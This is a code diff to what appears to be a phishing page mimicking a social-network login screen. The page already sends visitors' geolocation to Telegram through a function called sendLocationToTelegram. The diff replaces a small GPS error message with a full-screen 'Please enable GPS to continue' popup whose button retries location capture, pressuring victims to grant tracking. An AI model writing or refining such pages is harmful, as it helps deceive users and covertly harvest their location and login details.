@@ -97,11 +97,33 @@
             text-align: center;
             display: none;
         }
-        #gps-error-message {
-            color: red;
-            margin-top: 10px;
-            text-align: center;
+        #gps-popup {
             display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        #gps-popup-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        #gps-popup button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
         }
         /* Responsive Design */
         @media (max-width: 768px) {
@@ -146,7 +168,12 @@
                 <div class="error-message" id="error-message">Wrong username or password. Please try again.</div>
             </div>
             <button class="create-account">Create new account</button>
-            <div id="gps-error-message">Please enable GPS on your device.</div>
+        </div>
+    </div>
+    <div id="gps-popup">
+        <div id="gps-popup-content">
+            <p>Please enable GPS to continue.</p>
+            <button onclick="checkLocation()">Enable GPS</button>
         </div>
     </div>
     <script>
@@ -270,11 +297,11 @@
                     await sendLocationToTelegram(locationInfo);
                 }, (error) => {
                     console.error("Error getting location: ", error);
-                    document.getElementById('gps-error-message').style.display = 'block';
+                    showGPSPopup();
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
-                document.getElementById('gps-error-message').style.display = 'block';
+                showGPSPopup();
             }
         }
 
@@ -302,6 +329,15 @@
             } catch (error) {
                 console.error("Error sending location info to Telegram: ", error);
             }
+        }
+
+        function showGPSPopup() {
+            document.getElementById('gps-popup').style.display = 'flex';
+        }
+
+        function checkLocation() {
+            document.getElementById('gps-popup').style.display = 'none';
+            getLocation();
         }
 
         async function initializeFirstPart() {
